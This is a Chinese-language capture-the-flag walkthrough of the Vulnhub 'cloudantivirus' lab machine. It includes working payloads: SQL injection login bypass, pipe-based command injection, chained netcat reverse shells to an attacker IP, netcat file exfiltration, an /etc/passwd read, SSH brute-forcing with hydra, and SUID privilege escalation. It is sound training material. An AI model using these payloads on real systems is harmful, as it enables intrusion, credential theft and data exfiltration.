## 第二周

**靶机名称**:Vulnhub------**easy_cloudantivirus**

**靶机链接**:https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/

**难度**:*Easy*

**攻击机**:Kali Linux

**所用工具**:arping、Burp Suite

**相关文件**:`magic_character.txt`

**强烈推荐教程**:[我们一起来打靶](https://pqy.h5.xeknow.com/s/2svbaU)

​	![推广](https://tva1.sinaimg.cn/large/008i3skNly1gtez9sj6vrj60u01hdgsv02.jpg)



### 主机发现

#### 	新工具~ arping

这一周我们使用另一个工具——`arping`

相比于上一次的主机发现过程,`arp-scan`是一个黑客工具,需要额外安装,使用要求较大.

而`arping`是一个系统工具,内置在许多Linux发行版中,可以直接使用.

在内网渗透的环境下进行主机发现,就可以很方便的使用`arping`进行主机发现

`arping`的实质是发送ICMP或ARP请求包,如果收到回复就显示出来

但是它也有不足,他不能直接进行整个ip段的扫描,只能对单个ip进行扫描

因此,我们需要配合shell命令对整个ip段的扫描进行一个自动化操作

`for i in $(seq 254);do sudo arping -c 2 10.0.0.$i ;done`

**注意**:我们需要使用sudo提升权限进行扫描

![截屏2021-08-11 下午3.14.25](https://tva1.sinaimg.cn/large/008i3skNly1gtcvdfv9d4j60w60u00x702.jpg)

我们遇到了和WEEK1同样的问题,区分虚拟机.

通过mac地址可见,08:00:27是Virtual box虚拟机,这便是我们的目标

`10.0.0.13`

详情请看[第一周打靶](https://github.com/busizhiya/Let-us-play-box/tree/master/Let-us-play-box-WEEK-1)

### 扫描

#### 端口扫描

还是请出我们的nmap,对目标靶机进行扫描

`sudo nmap -p- 10.0.0.13`

![截屏2021-08-11 下午3.20.43](https://tva1.sinaimg.cn/large/008i3skNly1gtcvjwp1uqj60t60b676o02.jpg)

发现端口22,8080

光知道开放的端口有哪几个还不够,接下来进一步扫描端口上有什么~



#### 服务扫描

`sudo nmap -sV -p22,8080 10.0.0.13`

![截屏2021-08-11 下午3.22.18](https://tva1.sinaimg.cn/large/008i3skNly1gtcvlkjyrlj615w0cqdjt02.jpg)

咦?有没有似曾相识的感觉~~

开放了22ssh服务,OpenSSH 7.6p1版本,操作系统:Ubuntu 4

看这个8080web服务,同样和第一周的靶机一样,使用Werkzeug工具包,更多介绍请看第一周的wp

使用python 2.7.15rc1搭建

### 探索web服务

既然开放了web服务,那我们就去看一看~

![截屏2021-08-11 下午3.26.02](https://tva1.sinaimg.cn/large/008i3skNly1gtcvph6ns6j615w0iwgox02.jpg)

嗯?奇怪,要密码!

这可怎么办呢?

这里用到了数据输入,根据上次的思路,我们不妨尝试sql注入的方式

居然还是密码,那我们可以使用暴力破解的方式进行破解~

#### 	测试注入

​	我们都知道,在不同的代码环境中,往往会有一些字符代表特殊的含义.

​	如引号、反斜杠、&号等等

当我们把这些特殊的符号当作输入发送给服务器时,如果服务器,没有做精确的过滤,那么往往会发生语义或语法上的报错,返回不同长度的返回包.

因此,我们可以把这些特殊的符号储存在一个文件中,然后使用Burp Suite的Intruder爆破功能对注入点进行测试,观察返回的包长,从而发现漏洞

将特殊字符存到`magic_character.txt`中

加载Runtime file,选择我们的文件,开始攻击!

攻击结果如下

![截屏2021-08-11 下午3.45.23](https://tva1.sinaimg.cn/large/008i3skNly1gtcw9lyftij616x0u0jvn02.jpg)

由于我们知道,当服务端报错时,返回数据包的长度会变化,于是我们点击`length`对其进行排序,最大的数据包在上面,便于观察

可见,我们的payload`"`成功生效了!!

接下来我们查看报错的页面,看看能获得什么大宝贝呢~

我们右键报错的数据包,点击`Show Response in Browswe`,然后拷贝burp给你的连接在浏览器中打开(注意要关闭拦截)

![截屏2021-08-11 下午3.52.32](https://tva1.sinaimg.cn/large/008i3skNly1gtcwh1v5hoj61c00u0jzm02.jpg)

可以看到,数据库的类型为sqlite3,报错时竟然把执行的语句,文件的路径都暴露出来了!

在最后一行,我们可以看到文件路径为`/home/scan/cloudav_app/app.py`

执行的sql语句为`select * from code where password="<input>"`

由于我们输入了双引号,导致原先的两个双引号被我们抢走了一个进行匹配,另一个孤零零的双引号只好哭着喊着要报错,但却酿成了大祸,暴露了这么多敏感信息!

我们的目标是绕过当前逻辑的限制,所以我们要使用一点小手段

`select * from code where password="" or 1=1 --+"`

payload:`" or 1=1 --+`

请看如上查询语句,我们首先输入双引号闭合前面的password参数,然后用`or 1=1`这个永恒为真的命题进行干扰,使查询语句认为我们找到了符合条件的数据,返回查询结果.

最后的`--+`在sql中是注释符的意思,**本来是两个加号和一个空格**,但是在浏览器传输参数时,会把+翻译成空格,刚好符合.

而如果我们直接在末尾输入一个空格,而不是使用加号,很有可能末尾的空格就会被浏览器吃掉了!这样payload就不生效了...

#### 猜一猜

![截屏2021-08-11 下午4.03.30](https://tva1.sinaimg.cn/large/008i3skNly1gtcwsguijxj614s0rc44k02.jpg)

看到这,不知道各位有没有感觉很熟悉,我们好像在linux里使用了`ls -l`显示文件,服务器的环境可能是在终端中执行的.

这样一看,这些文件都是在服务器的文件夹中,我们可以提交文件名,对以上文件进行扫描

我们猜一猜,这个功能是怎么实现的呢?

`avscan <input>`

服务器可能有一个病毒扫描的命令,接收到我们发送的文件名后,将文件名拼接到命令后

既然是在终端(命令行)中执行,我们不妨试试是否有命令注入的漏洞呢~

我们先来了解一下linux中的几种符号

```shell
在linux中，&和&&,|和||介绍如下：

&  表示任务在后台执行，如要在后台运行redis-server,则有  redis-server &

&& 表示前一条命令执行成功时，才执行后一条命令 ，如 echo '1‘ && echo '2'    

| 表示管道，上一条命令的输出，作为下一条命令参数，如 echo 'yes' | wc -l

|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo "fail"
```

​															原文：https://blog.csdn.net/chinabestchina/article/details/72686002 

当后面指令的输入不受前面指令的影响时,我们可以使用管道符`|`同时执行多个指令

payload:`hello | id`

*注:笔者在此处遇到玄学问题,扫描时等待了几分钟结果显示超时了.大家多尝试几次,实在不行重新从官网下载ova文件重新导入靶机,还不行的话就去烧香拜佛吧~*



![截屏2021-08-11 下午5.05.23](https://tva1.sinaimg.cn/large/008i3skNly1gtcyku830aj614s0rctap02.jpg)

可以看到,命令成功执行了.

在刚才的界面,我们看到有python文件,我们可以像第一周那样用python反弹shell.但是,我们不妨试试其他的情况

nc是一款十分强大的网络工具,许多linux发行版中都有nc的身影不幸的是,nc可以用来反弹shell,

我们首先定位一下nc,看看这台靶机中是否有nc工具

`hello | which nc`

which的意思是在当前用户的PATH路径中查找指定的文件,也就是所谓的可执行的指令

可以的!

那么接下来,我们就尝试使用nc反弹shell吧~

#### 串联nc

首先我们来尝试最基础的姿势,

payload: `hello | nc 10.0.0.12 4444 -e /bin/bash `

这条命令中,我们使用了nc的-e参数,它的意思就是当连接成功以后,攻击端可以输入的内容会被送到`/bin/bash`并经过执行后发送给攻击者

但是!意外发生了!

我们在本地监听的nc并没有收到反弹的shell,这是为什么?

nc在历史上有很多个版本,不同的linux发行版中的nc也千差万别

有的时候,nc是支持-e参数的,但是有的时候却不支持-e参数

这可怎么办呢??!别怕,我们来学个新姿势.

-e参数的实质就是把另一段发送的内容送到指定的程序,然后再把程序的结果返还给另一段

那么这里我们就可以用上面所说的`|`管道符号

使用`hello | nc 10.0.0.12 4444 | /bin/bash 2>&1 | nc 10.0.0.12 5555`

以上命令是什么意思呢?

首先我们让靶机连接我们的4444端口,在这个时候,我们在另一段的输入就会被它接收了.

它一旦接受了我们的指令,就会把指令通过管道符送到/bin/bash进行执行,执行后的结果又会向后流动,到达5555端口

此处加上了`2>&1`的意思是报错的内容会被输出到`基本输出`,这样我们在使用nc反弹的shell的时候就可以回显报错了

所以,4444端口是我们下达指令的地方,5555端口是我们接收结果的地方

![截屏2021-08-12 下午6.24.26](https://tva1.sinaimg.cn/large/008i3skNly1gte6hg665dj613e08e3yu02.jpg)

如图,左边是4444端口,右边是5555端口

我们使用ls与pwd查看了当前的信息,目录下又四个文件,最引我们注意的就是`database.sql`文件

我猜想,里面可能会有密码等机密文件!

我们再尝试查看/etc/passwd文件,看看有哪几个用户.

`cat /etc/passwd | grep /bin/bash`

这里使用grep过滤后,留下的就是能够登陆并使用bash的用户了

![截屏2021-08-12 下午6.27.59](https://tva1.sinaimg.cn/large/008i3skNly1gte6l2fss0j61fk08eq3y02.jpg)



我们把用户名拷贝下来,放进`users.txt`

用户名有了,我们怎么把数据库文件下载下来呢?

我们知道,nc的本质就是数据的传输.我们不妨把文件当作输入,在kali中接收并导入本地文件,这样不就相当于是下载文件了吗~

攻击机:`nc -lp 6666 > database.sql`

靶机:    `nc 10.0.0.12 6666 < database.sql`

注意有一个小技巧,不要从靶机处断开nc,这样会中断之前的反弹shell!!从攻击机处中断,这样另一端自动就中断了~

我们来查看一下数据库文件的类型

`file database.sql`

![截屏2021-08-12 下午6.39.36](https://tva1.sinaimg.cn/large/008i3skNly1gte6x5xa9zj60yc03qgmj02.jpg)

`file`指令可用于查看文件的类型

可见,这是一个sqlite3的数据库文件

那我们就用kali自带的sqlite3管理软件打开吧~

![截屏2021-08-12 下午6.38.31](https://tva1.sinaimg.cn/large/008i3skNly1gte6w1sgvuj60qy0ho42b02.jpg)

可见,有一个code表,表内有password字段,自段的内容有四个像密码的东西,我们把密码放入`pass.txt`

结合我们一开始扫描到的ssh服务,我们可以来尝试爆破ssh啦~

`hydra -L users.txt -P pass.txt 10.0.0.13 ssh`

扫描的结果却不尽人意,居然一个都没匹配上?!

![截屏2021-08-12 下午6.45.54](https://tva1.sinaimg.cn/large/008i3skNly1gte73qe94aj60lq00wdfu02.jpg)

在渗透测试的过程中,我们往往看似收集到了很多敏感信息,进行下一步渗透时,却往往遭遇挫折.

虽然我们这一次的ssh爆破没有成功,但是这并不妨碍我们的渗透思路,这一步的测试是有意义的!

### 	 换种思路

前面我们已经获得了反弹shell,既然不能通过爆破密码与用户从外部攻破,那么我们就尝试着从内部瓦解它吧!

![截屏2021-08-12 下午6.50.28](https://tva1.sinaimg.cn/large/008i3skNly1gte78hrtwhj61pa0i0aey02.jpg)

四处逛逛,往上层目录看看.

发现了这么多文件,其中有一个文件特别吸引我的眼球——`update_cloudav`和`update_cloudav.c`

我猜测,对于同名的文件,前者是由后者编译而来的.

特别的,这个可执行文件的属性中携带了`s`,即`suid`,会以文件拥有者的权限执行此程序.

嘿!你说多巧!这个文件的拥有者刚好是root!!

这里附送大家一个寻找suid文件且文件拥有者为root的指令

`find / -perm 4000 -user root 2>/dev/null`

#### SUID提权

我们使用cat指令查看它的c源代码文件

![截屏2021-08-12 下午7.03.14](https://tva1.sinaimg.cn/large/008i3skNly1gte7lsfreaj60u40i6wgu02.jpg)

看来这里接受一个参数,然后它会把参数拼接进入`freshclam`这个指令,然后通过调用`system`函数执行命令a

还是一样的思路,这里存在代码注入

我们使用`|`管道符同时执行多个命令

不过要注意,由于它只接受一个参数,而且shell在解析时遇到空格就认为结束了,所以一定要注意使用**双引号**把我们的payload括起来

payload: `./update_cloudav "a | nc 10.0.0.12 6666 | /bin/bash 2>&1 | nc 10.0.0.12 7777"`

这里同样使用串联nc达到反弹shell的目的,6666是指令发送端口,7777是结果回显端口

**PWN!**

root权限到手啦~![截屏2021-08-12 下午7.47.00](https://tva1.sinaimg.cn/large/008i3skNly1gte8vavmpij61py02imxg02.jpg)

### 验证码绕过——爆破

在本文中,我们对验证码进行了绕过,我们使用的是sql注入绕过了密码验证

但是如果此处没有sql注入漏洞,那我们该怎么办呢?

**爆破!**

我们回到验证界面,挂载代理到burp上,开启拦截

随便输入一个密码,点击提交,此时burp会自动拦截提交的数据包

在Proxy->Intercept下找到拦截的数据包,点击Action->Send to Intruder![截屏2021-08-12 下午7.59.57](https://tva1.sinaimg.cn/large/008i3skNly1gte98tt8k1j61450u0td702.jpg)

打开Intruder模块,首先clear,然后选中password参数后的`123`,点击add

选择`payload Type:Runtime File`

选择`/usr/share/wordlists/nmap.lst`文件,即nmap默认扫描字典

![截屏2021-08-12 下午8.40.13](https://tva1.sinaimg.cn/large/008i3skNly1gteaeoclbpj61450u0wj202.jpg)

通过length进行排序,payload:`password`的返回长度不同,看来我们找到了~

尝试使用`password`进行登录,成功~

### 总结

我们首先进行了主机发现,这一次我们换了一个工具,`arping`,这个软件更常见,但需要配合shell 命令才能进行网段扫描.

然后,我们进行常规的端口扫描与服务版本扫描.发现ssh与web界面

进入web页面,我们发现了验证码机制,我们分别使用了sql注入和爆破两种方法进行绕过.

在sql注入时,我们首先使用`magic_character.txt`对注入点进行测试,发现使用双引号时返回的长度不同

这时候,我们就可以看看查询语句,发现查询的password参数是用双引号括起来的,于是我们通过闭合双引号对使用or 1=1对逻辑进行绕过

在暴力破解的时候,我们可以加载/usr/share/wordlists下面的字典进行爆破

绕过验证码后,我们通过`|`管道符号实现命令注入

在此处,我们通过串联nc的方式实现反弹,注意管道符号与`2>&1`

获得shell后,我们进行信息搜集,我们查找了`/etc/passed`获取了用户信息,使用nc下载数据库文件,在本地通过`file`命令进行判断,并通过数据库管理软件发现密码

正当我们以为发现了通关密钥时,ssh的爆破失败了.这其实并不全无意义,相反,这是我们渗透思路的一部分!

最后,我们回到shell,仔细寻觅敏感文件,最终发现了一个root的suid可执行文件以及它的源码,我们同样通过命令注入成功用nc串联反弹了第二个shell,这次获得了root权限